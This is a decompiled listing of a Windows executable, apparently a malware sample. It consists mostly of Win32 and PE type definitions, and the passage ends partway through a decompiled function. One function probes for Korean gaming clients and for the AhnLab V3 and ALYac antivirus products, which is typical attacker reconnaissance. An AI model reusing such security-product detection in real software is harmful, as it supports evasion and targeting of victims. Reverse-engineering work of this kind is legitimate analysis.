typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void *pVFTable;
    void *spare;
    char name[0];
};

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    RTTIClassHierarchyDescriptor *pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    RTTIBaseClassDescriptor **pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    RTTIClassHierarchyDescriptor *pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef ulonglong __uint64;

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef int BOOL;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

typedef uchar BYTE;

typedef long LONG;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef int INT_PTR;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

struct HWND__ {
    int unused;
};

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef LONG_PTR LRESULT;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef ulong DWORD;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void *HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef char CHAR;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef struct _EXCEPTION_POINTERS EXCEPTION_POINTERS;

typedef WCHAR *LPWCH;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef CHAR *LPSTR;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef ulong ULONG;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HACCEL__ HACCEL__, *PHACCEL__;

struct HACCEL__ {
    int unused;
};

typedef struct HACCEL__ *HACCEL;

typedef HINSTANCE HMODULE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME *LPFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef BOOL *LPBOOL;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef struct _CONSOLE_READCONSOLE_CONTROL _CONSOLE_READCONSOLE_CONTROL, *P_CONSOLE_READCONSOLE_CONTROL;

struct _CONSOLE_READCONSOLE_CONTROL {
    ULONG nLength;
    ULONG nInitialChars;
    ULONG dwCtrlWakeupMask;
    ULONG dwControlKeyState;
};

typedef struct _CONSOLE_READCONSOLE_CONTROL *PCONSOLE_READCONSOLE_CONTROL;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef ushort wint_t;

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef size_t rsize_t;

typedef ushort wctype_t;




void FUN_00401000(void)

{
  WCHAR local_418;
  undefined4 local_416;
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_418 = L'\0';
  FUN_00409600(&local_416,0,0x206);
  local_210 = L'\0';
  FUN_00409600(local_20e,0,0x206);
  GetSystemWindowsDirectoryW(&local_418,0x104);
  local_416._2_2_ = 0;
  wsprintfW(&local_210,u__s_s_00418654,&local_418,u__Hangame_KOREAN_HanUninstall_exe_00418610);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_00418654,&local_418,u__NEOWIZ_PMang_common_PMLauncher__00418660);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_00418654,&local_418,u__Netmarble_Common_NetMarbleEndWe_004186a8);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_00418654,&local_418,u__Program_Files_AhnLab_V3Lite30_V_004186f8);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_00418654,&local_418,u__Program_Files_ESTsoft_ALYac_AYL_00418750);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_00418654,&local_418,u__Program_Files_naver_NaverAgent__004187a8);
  GetFileAttributesW(&local_210);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_004011aa(int param_1)

{
  wchar_t wVar1;
  short sVar2;
  wchar_t *pwVar3;
  short *psVar4;
  
  if (DAT_0041af08 == 3) {
    psVar4 = &DAT_0041881c;
    do {
      sVar2 = *psVar4;
      *(short *)(param_1 + -0x41881c + (int)psVar4) = sVar2;
      psVar4 = psVar4 + 1;
    } while (sVar2 != 0);
    return;
  }
  if (DAT_0041af08 != 4) {
    if (DAT_0041af08 != 5) {
      pwVar3 = u_UnKnown_0041883c;
      do {
        wVar1 = *pwVar3;
        *(wchar_t *)(param_1 + -0x41883c + (int)pwVar3) = wVar1;
        pwVar3 = pwVar3 + 1;
      } while (wVar1 != L'\0');
      return;
    }
    pwVar3 = u_WinSeven_00418808;
    do {
      wVar1 = *pwVar3;
      *(wchar_t *)(param_1 + -0x418808 + (int)pwVar3) = wVar1;
      pwVar3 = pwVar3 + 1;
